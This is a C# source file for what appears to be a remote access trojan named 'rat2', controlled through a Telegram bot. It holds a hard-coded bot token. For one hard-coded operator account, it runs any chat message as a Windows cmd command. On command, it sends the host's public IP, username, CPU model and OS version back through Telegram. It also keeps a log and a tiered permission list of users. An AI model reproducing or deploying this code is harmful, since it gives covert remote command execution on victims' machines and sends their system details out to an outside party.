using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using Microsoft.Win32;
using static System.Net.Mime.MediaTypeNames;
using System.ComponentModel;
using System.Windows.Forms;

namespace rat2
{
    internal class Program
    {
        
        static void Main(string[] args)
        {
            if (System.IO.File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt") == false)
            {
                System.IO.File.Create($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt");
            }
            if (System.IO.File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\chs.txt") == false)
            {
                System.IO.File.Create($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\chs.txt");
            }
            if (System.IO.File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\admins.txt") == false)
            {
                System.IO.File.Create($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\admins.txt");
            }
            if (System.IO.File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\testers.txt") == false)
            {
                System.IO.File.Create($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\testers.txt");
            }
            if (System.IO.File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\defusers.txt") == false)
            {
                System.IO.File.Create($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\defusers.txt");
            }



            WebClient client2 = new WebClient();
            
            string a = "7685515061:AAElvuJkvJD6N8WaMrUpAuF4zsOGfR5QiQE";
            var client = new TelegramBotClient(a);
            client.StartReceiving(Update, Error);
            bool notExit = true;
            while (notExit == true)
            {
                string str = Console.ReadLine();
                if ((str == "exit") || (str == "quit"))
                    notExit = false;
            }
        }


        public static bool checkchs(string user)
        {
            var chi = System.IO.File.ReadAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\chs.txt");
            bool io = chi.Contains(user);
            return io;
        }
        public static bool checkaadmin(string user)
        {
            var chi = System.IO.File.ReadAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\admins.txt");
            bool io = chi.Contains(user);
            return io;
        }
        public static bool checkatester(string user)
        {
            var chi = System.IO.File.ReadAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\testers.txt");
            bool io = chi.Contains(user);
            return io;
        }
        public static bool checkadefuser(string user)
        {
            var chi = System.IO.File.ReadAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\defusers.txt");
            bool io = chi.Contains(user);
            return io;
        }

        async private static Task Update(ITelegramBotClient Client, Update update, CancellationToken token)
        {
            var message = update.Message;
            string fulld = "@maoisdf (7082333427)";
            
            bool chs = checkchs(message.From.ToString());
            bool admin = checkaadmin(message.From.ToString());
            bool tester = checkatester(message.From.ToString());
            bool defuser = checkadefuser(message.From.ToString());



            string pubIp = new System.Net.WebClient().DownloadString("https://api.ipify.org");
            bool getprava = message.Text.Contains("/give");
            bool getchs = message.Text.Contains("/bl");
            bool ab = message.Text.Contains("/clearlog");
            string prava = "";
            if (chs == false)
            {
                
                if (admin == true) { prava = "админ"; }
                if(tester == true) { prava = "тестер"; }
                if (defuser == true) { prava = "обычный юзер"; }
                if (message.From.ToString() == fulld) { prava = "полный доступ"; }
                await Console.Out.WriteLineAsync(message.Text + " " + message.Chat.Username + " " + message.From.ToString() + " " + $"доступ:{prava}");
                var tekst = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt"));
                System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt", tekst + "\n" + message.Text + "\n" + message.Chat.Username + "\n" + message.From + "\n" + $"[хост бота] имя юзера [{Environment.UserName}]: ос [{Environment.OSVersion}]" + "\n" + $"доступ:{prava}" + "\n" + $"время:{DateTime.Now}" + "\n" + "");
            }
            if (message != null)
            {
                if (message.Text == "/start")
                {
                    await Client.SendTextMessageAsync(message.Chat.Id, $"здравствуйте , у вас группа доступа:[{prava}]");

                }
                else if (message.Text == "/pchost")
                {
                    if (message.From.ToString() == fulld)
                    {
                        
                        await Client.SendTextMessageAsync(message.Chat.Id, "ver4(loger + groups)");
                        
                        string host = Dns.GetHostName();
                        DateTime dateTime = DateTime.Now;
                        await Client.SendTextMessageAsync(message.Chat.Id, pubIp.ToString());
                        await Client.SendTextMessageAsync(message.Chat.Id, $"time {dateTime}");
                        await Client.SendTextMessageAsync(message.Chat.Id, "Имя текущего пользователя:" + Environment.UserName);
                        await Client.SendTextMessageAsync(message.Chat.Id, "Модель процессора:" + Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER"));
                        await Client.SendTextMessageAsync(message.Chat.Id, "версия системы: " + Environment.OSVersion);
                        await Client.SendTextMessageAsync(message.Chat.Id, "число процессоров: " + Environment.ProcessorCount);
                        await Console.Out.WriteLineAsync(pubIp.ToString());
                        var tekst = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt"));
                        System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt", tekst + "\n" + $"айпи {pubIp.ToString()}" + "\n" + "");
                    }
                    else
                    {
                        if (chs == false)
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"ошибка: у вас недостаточно прав. Ваш доступ:{prava}.");
                            await Client.SendTextMessageAsync(message.Chat.Id, $"Ваш айди:{message.From.ToString()}.");
                            return;
                        }
                    }
                }
                else if (message.Text == "/chat")
                {
                    if ((message.From.ToString() == fulld) || (admin == true || (tester == true) ))
                    {
                        await Client.SendTextMessageAsync(message.Chat.Id, "Привет ждите сообщения");
                        while (true)
                        {
                            var calcs = Console.ReadLine();
                            if (calcs != null)
                            {
                                await Client.SendTextMessageAsync(message.Chat.Id, calcs);
                                break;
                            }
                        }
                    }
                    else
                    {
                        if (chs == false)
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"ошибка: у вас недостаточно прав. Ваш доступ:{prava}.");
                            await Client.SendTextMessageAsync(message.Chat.Id, $"Ваш айди:{message.From.ToString()}.");
                            return;
                        }
                    }

                }
                else if (message.Text == "/log")
                {
                    if (message.From.ToString() == fulld || (admin == true))
                    {
                        await Client.SendTextMessageAsync(message.Chat.Id, System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt")));
                    }
                    else
                    {
                        if (chs == false)
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"ошибка: у вас недостаточно прав. Ваш доступ:{prava}.");
                            await Client.SendTextMessageAsync(message.Chat.Id, $"Ваш айди:{message.From.ToString()}.");
                            return;
                        }
                    }

                }
                
                else if (ab == true)
                {
                    if (message.From.ToString() == fulld)
                    {
                        var prichina = message.Text.Substring(9);
                        if (prichina == "") { prichina = ""; }
                        await Client.SendTextMessageAsync(message.Chat.Id, $"лог удалён , причина:{prichina}");
                        System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt", $"лог удалён , причина:{prichina} . время:{DateTime.Now}" + "\n" + "");

                    }
                    else
                    {
                        if (chs == false)
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"ошибка: у вас недостаточно прав. Ваш доступ:{prava}.");
                            await Client.SendTextMessageAsync(message.Chat.Id, $"Ваш айди:{message.From.ToString()}.");
                            return;
                        }
                    }

                }
                else if (getprava == true)
                {
                    if (message.From.ToString() == fulld)
                    {
                        var tekst = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt"));
                        var admins = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\admins.txt"));
                        var testers = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\testers.txt"));
                        var defusers = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\defusers.txt"));
                        var lvl = message.Text.Substring(6);
                        var id = message.Text.Substring(8);
                        
                        if (lvl == "") { lvl = "1"; id = "none"; }
                       
                        if (lvl == $"1 {id}") 
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"выданы права {lvl} доступа");
                            System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt", tekst + "\n" + $"выданы права {lvl} доступа . время:{DateTime.Now}" + "\n" + " ");
                            System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\defusers.txt", defusers + "\n" + $"{id}"); 
                        }
                        if (lvl == $"2 {id}") 
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"выданы права {lvl} доступа");
                            System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt", tekst + "\n" + $"выданы права {lvl} доступа . время:{DateTime.Now}" + "\n" + " ");
                            System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\testers.txt", testers + "\n" + $"{id}"); 
                        }
                        if (lvl == $"3 {id}") 
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"выданы права {lvl} доступа");
                            System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt", tekst + "\n" + $"выданы права {lvl} доступа . время:{DateTime.Now}" + "\n" + " ");
                            System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\admins.txt", admins + "\n" + $"{id}"); 
                        }
                        else
                        {
                            if (chs == false)
                            {
                                await Client.SendTextMessageAsync(message.Chat.Id, $"ошибка:данной группы не существует.");
                                
                                return;
                            }
                        }

                    }
                    else
                    {
                        if (chs == false)
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"ошибка: у вас недостаточно прав. Ваш доступ:{prava}.");
                            await Client.SendTextMessageAsync(message.Chat.Id, $"Ваш айди:{message.From.ToString()}.");
                            return;
                        }
                    }

                }
                else if (getchs == true)
                {
                    if (message.From.ToString() == fulld || (admin == true))
                    {
                        var chsp = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\chs.txt"));
                        
                        var id = message.Text.Substring(4);
                        if (id != null)
                        {
                            var tekst = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt"));
                            await Console.Out.WriteLineAsync($"тест:{id}");
                            System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\logibotatg.txt", tekst + "\n" + " " + "\n" + $"выдан чс бота:[{id}]. время:{DateTime.Now}");
                            System.IO.File.WriteAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\chs.txt", chsp + "\n" + $"{id}");
                            await Client.SendTextMessageAsync(message.Chat.Id, $"пользователь [{id}] был добавлен в черный список");
                        }
                        else 
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, "ошибка:введите пользователя");
                        }
                        

                    }
                    else
                    {
                        if (chs == false)
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"ошибка: у вас недостаточно прав. Ваш доступ:{prava}.");
                            await Client.SendTextMessageAsync(message.Chat.Id, $"Ваш айди:{message.From.ToString()}.");
                            return;
                        }
                    }

                }
                else if (message.Text == "/listusers")
                {
                    if (message.From.ToString() == fulld || (admin == true) || (tester == true))
                    {

                        
                        var admins = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\admins.txt"));
                        var testers = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\testers.txt"));
                        var defusers = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\defusers.txt"));
                        var chsu = System.IO.File.ReadAllText(($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\abot\\chs.txt"));
                        
                        await Client.SendTextMessageAsync(message.Chat.Id, $"АДМИНЫ[{admins}]" + "\n" + $"ТЕСТЕРЫ[{testers}]" + "\n" + $"ОБЫЧНЫЕ ЮЗЕРЫ[{defusers}] " + "\n" + $"ЧС[{chsu}]");
                    }
                    else
                    {
                        if (chs == false)
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"ошибка: у вас недостаточно прав. Ваш доступ:{prava}.");
                            await Client.SendTextMessageAsync(message.Chat.Id, $"Ваш айди:{message.From.ToString()}.");
                            return;
                        }
                    }

                }

                else
                {
                    if (message.From.ToString() == fulld)
                    {
                        System.Diagnostics.Process.Start("cmd", $"/c {message.Text}");
                        string[] done = { "будет выполнено", "так точно", "есть повилитель" };
                        Random a = new Random();
                        int bomba = a.Next(0, 3);
                        await Client.SendTextMessageAsync(message.Chat.Id, done[bomba]);
                        
                    }
                    else
                    {
                        if (chs == false)
                        {
                            await Client.SendTextMessageAsync(message.Chat.Id, $"ошибка: у вас недостаточно прав. Ваш доступ:{prava}.");
                            await Client.SendTextMessageAsync(message.Chat.Id, $"Ваш айди:{message.From.ToString()}.");
                            return;
                        }
                    }
                }
            }
            
        }

        private static Task Error(ITelegramBotClient client, Exception exception, CancellationToken token)
        {
            throw new NotImplementedException();
        }
    }
}
